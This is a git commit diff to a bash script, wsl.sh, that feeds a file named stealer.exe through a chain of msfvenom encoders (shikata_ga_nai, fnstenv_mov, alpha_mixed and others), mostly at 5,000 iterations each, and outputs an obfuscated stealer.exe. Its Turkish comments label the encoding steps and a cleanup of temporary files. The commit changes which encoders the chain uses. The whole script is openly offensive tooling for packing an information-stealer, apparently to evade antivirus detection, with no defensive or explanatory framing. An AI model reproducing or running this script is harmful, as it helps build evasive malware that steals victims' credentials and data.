f975c83f3ec77585b297f917114d33a454ac9c0f
Lunix <cyln.elif1@gmail.com>
2024-09-22 16:50:05 +0300

    fixing bash

--- wsl.sh
+++ wsl.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
 
+#Temizlik
+rm temp*.exe
+
 # İlk encode işlemi
 msfvenom -x stealer.exe -p generic/custom --arch x86 -e x86/jmp_call_additive -i 5000 -f exe -o temp_stealer.exe
 
@@ -7,19 +10,13 @@ msfvenom -x stealer.exe -p generic/custom --arch x86 -e x86/jmp_call_additive -i
 msfvenom -x temp_stealer.exe -p generic/custom --arch x86 -e x86/shikata_ga_nai -i 5000 -f exe -o temp_stealer_v2.exe
 
 # Üçüncü encode işlemi
-msfvenom -x temp_stealer_v2.exe -p generic/custom --arch x86 -e x86/bloxor -i 5000 -f exe -o temp_stealer_v3.exe
+msfvenom -x temp_stealer_v2.exe -p generic/custom --arch x86 -e x86/fnstenv_mov -i 5000 -f exe -o temp_stealer_v3.exe
 
 # Dördüncü encode işlemi
-msfvenom -x temp_stealer_v3.exe -p generic/custom --arch x86 -e x86/fnstenv_mov -i 5000 -f exe -o temp_stealer_v4.exe
+msfvenom -x temp_stealer_v3.exe -p generic/custom --arch x86 -e x86/alpha_mixed -i 20 -f exe -o temp_stealer_v4.exe
 
 # Beşinci encode işlemi
-msfvenom -x temp_stealer_v4.exe -p generic/custom --arch x86 -e x86/alpha_mixed -i 5000 -f exe -o temp_stealer_v5.exe
+msfvenom -x temp_stealer_v4.exe -p generic/custom --arch x86 -e x86/service -i 5000 -f exe -o stealer.exe
 
-# Altıncı encode işlemi
-msfvenom -x temp_stealer_v5.exe -p generic/custom --arch x86 -e x86/service -i 5000 -f exe -o temp_stealer_v6.exe
-
-# Yedinci encode işlemi
-msfvenom -x temp_stealer_v6.exe -p generic/custom --arch x86 -e x86/nonalpha -i 5000 -f exe -o stealer.exe
-
-# Temizlik (isteğe bağlı)
-rm temp_stealer.exe temp_stealer_v2.exe temp_stealer_v3.exe temp_stealer_v4.exe temp_stealer_v5.exe temp_stealer_v6.exe
+# Temizlik
+rm temp_stealer.exe temp_stealer_v2.exe temp_stealer_v3.exe temp_stealer_v4.exe 
